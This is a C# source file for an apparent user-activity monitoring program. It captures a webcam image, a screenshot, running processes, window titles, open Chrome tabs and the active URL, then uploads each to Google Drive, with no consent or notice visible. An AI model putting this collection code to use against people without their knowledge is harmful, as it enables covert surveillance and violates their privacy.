﻿using Infrastructure.DirectoryManager;
using Infrastructure.GoogleDriveApi;
using Infrastructure.Services;
using Infrastructure.ActiveProgram;
using System;
using System.Threading.Tasks;
using Infrastructure.BrowserActivity;
using Google.Apis.Drive.v3.Data;
using System.Collections.Generic;
using CoreActivities.EgmaCV;
using CoreActivities.BrowserActivity;

namespace UserActivities
{
    public class Application
    {
        private readonly IEgmaCv _egmaCv;
        private readonly IDirectoryManagerService _directoryManagerService;
        private readonly IGoogleDriveApiManagerAdapter _googleDriveApiManagerAdapter;
        private readonly IScreenCaptureService _screenCaptureService;
        private readonly IRunningProgramService _runningProgramService;
        private readonly IActiveProgramService _activeProgramService;
        private readonly IBrowserActivityService _browserActivityService;
        private string _folderName;

        public Application(IEgmaCv egmaCv,
            IScreenCaptureService screenCaptureService,
            IRunningProgramService runningProgramService,
            
            IDirectoryManagerService directoryManagerService,
            IGoogleDriveApiManagerAdapter googleDriveApiManagerAdapter,
            IActiveProgramService activeProgramService,
            IBrowserActivityService browserActivityService)
        {
            _egmaCv = egmaCv;
            _screenCaptureService = screenCaptureService;
            _runningProgramService = runningProgramService;

            _directoryManagerService = directoryManagerService;
            _folderName = AppSettingsInfo.GetCurrentValue<string>("FolderName");
            _googleDriveApiManagerAdapter = googleDriveApiManagerAdapter;
            _activeProgramService = activeProgramService;
            _browserActivityService = browserActivityService;
        }

        public async Task Run()
        {
            try
            {
                Console.WriteLine("Starting User Activities");

                ////Capture webcam image and sync to google drive
                var fileName = $"{Guid.NewGuid()}.jpg";
                var filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _egmaCv.CaptureImageAsync(0, filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                ////Capture user screen and sync to google drive
                fileName = $"{Guid.NewGuid()}.jpg";
                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _screenCaptureService.CaptureScreenAsync(1920, 1080, filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                ////Capture processes and sync to google drive 
                fileName = $"Processes-{Guid.NewGuid()}.txt";
                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _runningProgramService.CaptureProcessNameAsync(filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                ////Capture running program title and sync to google drive 
                fileName = $"ProgramTitles-{Guid.NewGuid()}.txt";
                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _runningProgramService.CaptureProgramTitleAsync(filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                ////Capture active window title and sync to google drive 
                fileName = $"ActiveWindow-{Guid.NewGuid()}.txt";
                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _activeProgramService.CaptureActiveProgramTitleAsync(filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                ////Capture open browser tab title and sync to google drive
                fileName = $"Tabs-{Guid.NewGuid()}.txt";
                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _browserActivityService.EnlistAllOpenTabs(BrowserType.Chrome, filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                ////Capture active tab url and sync to google drive
                fileName = $"Url-{Guid.NewGuid()}.txt";
                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _browserActivityService.EnlistActiveTabUrl(BrowserType.Chrome, filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                //var files = await PrintFilesInAGoogleDirectory();
                //var input = Console.ReadLine();
                //var index = int.Parse(input);

                //if (index > -1)
                //    await _googleDriveApiManagerAdapter.DeleteAsync(files[index].Id);

                Console.WriteLine("Done");
            }
            catch (Exception exp)
            {
                Console.WriteLine(exp.Message);
            }
        }

        private async Task<IList<File>> PrintFilesInAGoogleDirectory()
        {
            var files = new List<File>();

            var optionals = new FilesListOptionalParms
            {
                PageSize = 5, //Provide positive integer for pagination
                Fields = "nextPageToken, files(id, name, mimeType, kind, trashed)" //Follow this pattern to retrive only specified object fields
            };

            GoogleDriveFiles results = null;
            var counter = 0;

            do
            {
                if (results == null)
                    results = await _googleDriveApiManagerAdapter.GetFilesAndFolders(null, optionals);
                else
                    results = await _googleDriveApiManagerAdapter.GetFilesAndFolders(results.NextPageToken, optionals);

                files.AddRange(results.Files);

                foreach (var item in results.Files)
                {
                    Console.WriteLine($"SL: {counter} Name: {item.Name}");
                    counter++;
                }

            } while (results != null && !string.IsNullOrEmpty(results.NextPageToken));

            return files;
        }
    }
}
